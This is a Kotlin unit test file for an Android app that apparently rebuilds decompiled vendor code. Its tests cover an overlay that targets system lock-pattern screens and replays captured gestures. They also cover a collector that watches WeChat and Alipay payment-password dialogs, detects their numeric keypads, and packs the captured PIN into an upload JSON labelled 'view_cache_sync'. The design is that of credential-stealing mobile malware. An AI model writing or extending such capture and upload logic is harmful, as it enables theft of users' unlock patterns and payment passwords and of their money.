package com.storm.safe.rock.service.modules.cipher

import org.junit.Assert.*
import org.junit.Test
import org.junit.runner.RunWith
import org.robolectric.RobolectricTestRunner
import org.robolectric.annotation.Config

/**
 * Phase 7.4 PatternCaptureOverlay 测试。
 * Phase 7.6 ViewCacheCollector 测试。
 *
 * JADX 源码:
 *   C0337a3.java (1048 行) — PatternCaptureOverlay
 *   C0341a7.java (563 行) — ViewCacheCollector
 *   C0340a6.java (170 行) — ViewCacheCollectorCompanion
 */
@RunWith(RobolectricTestRunner::class)
@Config(sdk = [30])
class PatternCaptureAndVCCTest {

    // ==================== PatternCaptureOverlay ====================

    @Test
    fun `PatternCaptureOverlay singleton initially null`() {
        assertNull(PatternCaptureOverlay.instance)
    }

    @Test
    fun `PatternCaptureOverlay cachedStyle initially null`() {
        assertNull(PatternCaptureOverlay.cachedStyle)
    }

    @Test
    fun `PatternCaptureOverlay PATTERN_VIEW_IDS contains system IDs`() {
        val ids = PatternCaptureOverlay.PATTERN_VIEW_IDS
        assertTrue(ids.contains("com.android.systemui:id/lockPattern"))
        assertTrue(ids.contains("com.android.settings:id/lockPattern"))
        assertTrue(ids.contains("com.samsung.android.biometrics.app.setting:id/lockPattern"))
    }

    @Test
    fun `PatternCaptureOverlay PATTERN_VIEW_IDS has 6 standard entries`() {
        assertTrue(PatternCaptureOverlay.PATTERN_VIEW_IDS.size >= 6)
    }

    @Test
    fun `PatternCaptureOverlay isDarkMode detection logic`() {
        // 模拟 uiMode 检查逻辑
        val darkMode = 32  // Configuration.UI_MODE_NIGHT_YES
        val nightMask = 48 // Configuration.UI_MODE_NIGHT_MASK
        val isDark = (darkMode and nightMask) == 32
        assertTrue(isDark)

        val lightMode = 16 // Configuration.UI_MODE_NIGHT_NO
        val isLight = (lightMode and nightMask) == 32
        assertFalse(isLight)
    }

    @Test
    fun `PatternCaptureOverlay dark mode color values`() {
        // vendor: isDarkMode → 1728053247, else → 1291845632
        val darkColor = 0x66FFFFFF.toInt()  // 1728053247
        val lightColor = 0x4D000000.toInt() // 1291845632

        // 验证色值符合预期
        assertEquals(0x66, (darkColor ushr 24) and 0xFF) // alpha ~0.4
        assertEquals(0x4D, (lightColor ushr 24) and 0xFF) // alpha ~0.3
    }

    @Test
    fun `PatternCaptureOverlay replayGesture requires at least 2 points`() {
        // vendor: listM213303j0 (reverse) → if size < 2, return false
        val points = listOf(android.graphics.PointF(100f, 200f))
        assertTrue(points.size < 2) // 不够回放
    }

    @Test
    fun `PatternCaptureOverlay adjustCoordinates for dual screen`() {
        // vendor: a3 — 如果 rect.left >= screenWidth, 减去 screenWidth
        val screenWidth = 1080
        val rect = android.graphics.Rect(1200, 100, 1400, 500)
        if (rect.left >= screenWidth) {
            rect.left -= screenWidth
            rect.right -= screenWidth
        }
        assertEquals(120, rect.left)
        assertEquals(320, rect.right)
    }

    @Test
    fun `PatternCaptureOverlay min bounds check`() {
        // vendor: 跳过 width < 50 || height < 50 的无效边界
        val valid = android.graphics.Rect(0, 0, 100, 100)
        val invalid = android.graphics.Rect(0, 0, 30, 30)
        assertTrue(valid.width() > 50 && valid.height() > 50)
        assertFalse(invalid.width() > 50 && invalid.height() > 50)
    }

    @Test
    fun `PatternCaptureOverlay overlay window flags`() {
        // vendor: flags = 4786090
        // FLAG_NOT_FOCUSABLE | FLAG_NOT_TOUCH_MODAL | FLAG_WATCH_OUTSIDE_TOUCH | FLAG_LAYOUT_IN_SCREEN | FLAG_LAYOUT_INSET_DECOR
        val flags = 4786090
        assertTrue(flags > 0)
    }

    // ==================== ViewCacheCollector ====================

    @Test
    fun `ViewCacheCollector EXCLUDE_PACKAGES matches TouchViewManager`() {
        // VCC 和 TouchViewManager 共享排除列表
        assertTrue(TouchViewManager.EXCLUDE_PACKAGES.contains("com.android.systemui"))
    }

    @Test
    fun `ViewCacheCollector payment rule matching logic`() {
        // 规则匹配: pkg + winClasses
        data class PaymentRule(val pkg: String, val winClasses: List<String>, val appName: String)

        val rules = listOf(
            PaymentRule("com.tencent.mm", listOf("WalletPayUI"), "微信"),
            PaymentRule("com.eg.android.AlipayGphone", listOf("PayPwdDialogActivity"), "支付宝")
        )

        // 匹配: pkg 完全匹配
        val matched = rules.find { it.pkg == "com.tencent.mm" }
        assertNotNull(matched)
        assertEquals("微信", matched!!.appName)

        // 不匹配
        val notMatched = rules.find { it.pkg == "com.unknown.app" }
        assertNull(notMatched)
    }

    @Test
    fun `ViewCacheCollector window class matching`() {
        val winClasses = listOf("WalletPayUI", "PayPasswordDialog")
        val currentClass = "com.tencent.mm.plugin.wallet.pay.ui.WalletPayUI"

        val matches = winClasses.any { cls ->
            currentClass.contains(cls) || cls == currentClass
        }
        assertTrue(matches)
    }

    @Test
    fun `ViewCacheCollector keyboard detection requires 10 digits`() {
        // vendor: linkedHashSet.size >= 10 表示找到完整数字键盘
        val digits = setOf("0", "1", "2", "3", "4", "5", "6", "7", "8", "9")
        assertTrue(digits.size >= 10)

        val partial = setOf("0", "1", "2")
        assertFalse(partial.size >= 10)
    }

    @Test
    fun `ViewCacheCollector payment mode toggle`() {
        // 模拟支付模式切换
        var isPaymentMode = false
        var callbackCalled = false
        val callback: (Boolean) -> Unit = { mode ->
            callbackCalled = true
        }

        // 状态变化时触发回调
        val newMode = true
        if (isPaymentMode != newMode) {
            isPaymentMode = newMode
            callback(newMode)
        }
        assertTrue(callbackCalled)
        assertTrue(isPaymentMode)
    }

    @Test
    fun `ViewCacheCollector cipher result JSON structure`() {
        // 验证上传 JSON 的结构
        val json = org.json.JSONObject()
        json.put("type", "view_cache_sync")
        json.put("pkg", "com.tencent.mm")
        json.put("cls", "WalletPayUI")
        json.put("app", "微信")
        json.put("cipher", "123456")
        json.put("grade", "PASSWORD_QUALITY_NUMERIC_COMPLEX")
        json.put("ts", System.currentTimeMillis())

        assertEquals("view_cache_sync", json.getString("type"))
        assertEquals("123456", json.getString("cipher"))
        assertTrue(json.getLong("ts") > 0)
    }

    @Test
    fun `ViewCacheCollector appName extraction from package`() {
        // vendor: 如果 appName 为空，从 packageName 提取最后一段
        val pkg = "com.tencent.mm"
        val parts = pkg.split(".")
        val appName = parts.lastOrNull() ?: pkg
        assertEquals("mm", appName)
    }

    @Test
    fun `ViewCacheCollector strategy persistence format`() {
        // 验证策略 JSON 格式
        val strategy = org.json.JSONObject()
        strategy.put("packageName", "com.example.pay")
        strategy.put("appName", "TestPay")
        strategy.put("listenWinClasses", org.json.JSONArray().apply {
            put("PaymentActivity")
            put("PayPasswordDialog")
        })

        assertEquals("com.example.pay", strategy.getString("packageName"))
        assertEquals(2, strategy.getJSONArray("listenWinClasses").length())
    }
}
